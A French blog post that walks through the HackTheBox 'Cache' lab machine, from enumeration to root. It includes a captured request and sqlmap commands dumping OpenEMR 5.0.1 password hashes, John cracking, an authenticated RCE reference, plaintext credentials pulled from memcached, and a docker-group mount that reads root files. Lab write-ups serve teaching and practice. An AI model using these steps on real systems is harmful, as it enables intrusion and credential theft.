---
layout: post
title: HackTheBox - Cache
---


Etape 1: énumération réseaux de la machine

nmap -sC -sV -T5 10.10.10.188

Grâce à cette commande on peut voir les ports ouverts sur la machine ainsi que les possibles services qui se trouvent derrière.

On voit qu’il y a un service web ainsi que le service SSH

Avant de passer sur l'énumération du site on met dans notre fichier /etc/hosts la ligne suivante:

10.10.10.188 cache.htb
Etape 2: Enumération du site web
On se connecte à Burp pour naviguer sur le site et commencer à faire une arborescence de celui-ci.

On fait aussi de l'énumération sur cache.htb avec les commandes suivantes :

./ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://cache.htb/FUZZ -e php,js,txt

./dirsearch.py -u http://cache.htb -e php

dirbuster (utilisation de la version graphique)

On voit un grand nombre de fichier, ainsi qu’une page d’authentification.

Nous allons essayer de nous connecter :




Une pop-up nous indique que nous n’avons pas les bons identifiants, nous allons nous tourner vers les fichiers JS.















Le fichier nous donne un mot de passe et un compte mais malheureusement nous arrivons sur cette page : 






Rien de concluant sur cette page.







Nous nous concentrons maintenant sur la page author.html : 


On remarque que l’auteur est également à l’origine du projet Hospital Management System.
7

On se dit qu’il y a certainement un VirtualHost sur le serveur apache, qui nous redirige en fonction du site demandé. Nous tentons : 
cache.hsm
htb.hsm
hsm.htb

Succès avec hsm.htb.




Etape 3 : Enumeration sur hsm.htb

On recommence alors l’énumération avec les mêmes commandes sur ce nouveau site.

La aussi on se retrouve avec plein de fichiers et sous-dossiers.
On essaie avec admin.php: rien de très concluant.
Juste une page pour se connecter. On test des identifiants par défaut comme : root/root, admin/admin etc… Mais rien ne fonctionne. Cependant on y voit la version du CMS OpenEMR 5.0.1 patch(3).


Etape 4 : Recherche d’exploitation sur la version 5.0.1 d’OpenEMR

On cherche alors sur google “OpenEMR 5.0.1 cve” , on y trouve alors cette page :

https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69

Malheureusement il faut être authentifié, hors la page register.php ne fonctionne pas comme elle devrait et nous ne pouvons pas nous créer de compte.

On recherche alors “OpenEMR exploit” et nous tombons sur cette page :

https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf

Il s’agit du rapport d’audit concernant notre version, publié par OpenEMR eux mêmes.

Etape 5 : Exploitation de la SQLi

On y apprend que pour utiliser certains exploits il faut d’abord aller sur la page /portal/account/register.php et qu’on pourra ensuite essayer plusieurs exploit

On y voit plusieurs SQLi. On décide de se concentrer sur /portal/add_edit_event_user.php. 
On se rend sur cette page, on copie les headers qu’on colle dans un fichier texte. 
Pour l’exploiter avec sqlmap on utilise l’option -r pour prendre notre fichier en paramètre et avec les commandes suivantes on trouve l’utilisateur admin :
Contenu de text.txt : 
GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
Host: hms.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: OpenEMR=l8jg1n25bv4oi55imfua46mf4k; PHPSESSID=ucra65vd67k04tjqn3odev2fbg
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0



Commandes
py sqlmap.py -r text.txt --dbs
py sqlmap.py -r text.txt -D openemr --tables
py sqlmap.py -r text.txt -D openemr -T users_secure --dump


Une fois le mot de passe récupéré, nous tentons de le cracker avec JohnTheRipper vu que c’est un hash. On copie le hash dans un fichier qu’on lui donne avec la commande suivante :

john pass.txt 

Cette commande va nous renvoyer le résultat suivant :

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 32 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
xxxxxx       	(?)
1g 0:00:00:00 DONE 2/3 (2020-09-11 15:42) 1.754g/s 2021p/s 2021c/s 2021C/s water..88888888
Use the "--show" option to display all of the cracked passwords reliably
Session completed

On voit donc que le mot de passe pour openemr_admin est xxxxxx. Une fois qu’on a cette information on peut aller se connecter sur la page de login de OpenEMR

Etape 6 : Exploitation de la RCE
Maintenant qu’on à un accès admin on peut exploiter une RCE qui demandait d’être authentifié :

https://www.exploit-db.com/exploits/48515

Une fois connecté, on essaye de faire spawn un shell digne de ce nom. Après plusieur essais avec https://netsec.ws/?p=337 celle qui a marcher est :

/usr/bin/script -qc /bin/bash /dev/null

Ensuite on fait :
cat /etc/passwd

Pour voir tous les utilisateur de la machine. On voit ash,luffy et root. On se souvient alors que sur le premier site , cache.htb, on avait eu des creds pour ash. On les essaie avec :

su ash
H@v3_fun

Et voilà nous sommes connectés, nous récupérons le flag user.txt



Etape 7 : Enumération Linux + Pivot Luffy
Maintenant il nous reste plus qu’à passer root, on a donc chercher les SUID : 

find / -perm 4000 2>/dev/null

Rien trouvé, ainsi que pour les GUID. Or quand on affiche /etc/group on voit que l’utilisateur luffy fait parti d’un groupe docker, or on sait que des élévations de privilèges depuis docker existent. On tente alors de se connecter avec luffy pour ensuite trouver le flag root.
On décide alors de regarder ce qui tourne sur la machine via :

netstat -tunlp

Nous voyons un port inconnu. Après quelques recherches nous découvrons ce service :

memcached

Pour se connecter au serveur memcached on fait la commande suivante :

telnet 127.0.0.1 11211

Une fois connectés, nous avons fait la commande suivante après quelque recherche sur https://lzone.de/cheat-sheet/memcached :

stats cachedump 1 0
sortie :
ITEM link [21 b; 0 s]
ITEM user [5 b; 0 s]
ITEM passwd [9 b; 0 s]
ITEM file [7 b; 0 s]
ITEM account [9 b; 0 s]
END

On voit alors qu’on a un item passwd qu’on récupère via :

get passwd 
sortie :
VALUE passwd 0 9
0n3_p1ec3
END


Nous faisons la concordance que 0n3_p1ec3 correspond au mot de passe de luffy on essaie alors de si connecter et ça marche


Etape 8 : Elévation de privilège via Docker

Une fois connecté en luffy on vérifie les groupes 

id
uid=1001(luffy) gid=1001(luffy) groups=1001(luffy),999(docker)

Nous voyons que l’utilisateur appartient bien au groupe docker, nous cherchons alors une vulnérabilité permettant de lire les fichiers réservés à root.

Après des recherches sur internet sur l’élévation de privilèges via docker, nous construisons la commande suivante : 

docker run -v /root:/mnt ubuntu cat /mnt/root.txt



TADA ! le flag root



